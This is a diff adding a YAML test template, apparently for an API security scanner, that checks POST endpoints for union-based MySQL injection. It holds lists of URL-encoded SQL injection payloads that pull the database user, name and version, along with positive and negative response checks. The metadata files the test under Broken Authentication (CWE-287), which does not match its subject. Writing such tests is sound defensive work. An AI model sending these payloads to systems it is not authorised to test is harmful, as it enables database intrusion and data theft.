@@ -1,0 +1,201 @@
+id: UNION_URL_ENCODED_BASED_MYSQLI_POST
+info:
+  name: "Union based SQL Injection test with URL Encoded Payloads for MySQL on POST method APIs"
+  description: "The Union Based SQL Injection Test with URL Encoded Payloads for MySQL on POST method APIs targets vulnerabilities where SQL queries are manipulated using the UNION SQL operator. By injecting URL-encoded payloads, attackers can bypass input sanitization and potentially retrieve unauthorized data from the database. This test checks whether the application correctly handles inputs and prevents unauthorized SQL queries from executing when encoded payloads are passed through POST method APIs. It aims to exploit improper validation of URL-encoded inputs to execute arbitrary SQL commands."
+  details: "The Union Based SQL Injection Test with URL Encoded Payloads for MySQL on POST method APIs specifically examines how a web application handles URL-encoded inputs within SQL queries. Attackers inject encoded SQL payloads through POST requests, aiming to manipulate the query and retrieve or modify sensitive data from the backend MySQL database. The test checks for weaknesses in input validation and the application's ability to detect and reject maliciously crafted SQL payloads, such as bypassing security mechanisms or filters by encoding characters like `=` or `&`."
+  impact: "The impact of a successful Union Based SQL Injection Test with URL Encoded Payloads for MySQL on POST method APIs can be severe. It may allow attackers to access, manipulate, or delete sensitive data from the database, including user credentials, personal information, or business-critical data. Additionally, it can lead to unauthorized privilege escalation, data corruption, and full compromise of the application. Exploiting this vulnerability could result in a breach of security, leading to potential data leaks, financial loss, and damage to an organization's reputation."
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_URL_ENCODED_BASED_MYSQLI_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    eq: "POST"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "%27%20UNION%20SELECT%201,%20user(),%20version()--"
+    - "%27%20UNION%20SELECT%201,%20database(),%20version()--"
+    - "%27%20UNION%20SELECT%201,%20current_user(),%20version()--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20schema()--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_os--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_machine--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20session_user()--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20now()--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20char(0x2F)--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20version_comment()--"
+  unionBasedNegativePayloads:
+    - "%27%20UNION%20SELECT%201,%20user(),%20version()%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20database(),%20version()%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20current_user(),%20version()%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20schema()%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_os%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20version_compile_machine%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20session_user()%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20now()%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20char(0x2F)%20WHERE%201%3D0%20--"
+    - "%27%20UNION%20SELECT%201,%20user(),%20version_comment()%20WHERE%201%3D0%20--"
+
+ 
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - UNION
+                - SELECT
+                - <html>
+                - </html>
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - UNION
+                - SELECT
+                - WHERE
+                - <html>
+                - </html>
+              neq: "${x1.response.body}"
+        - success: vulnerable
+
+
+
+
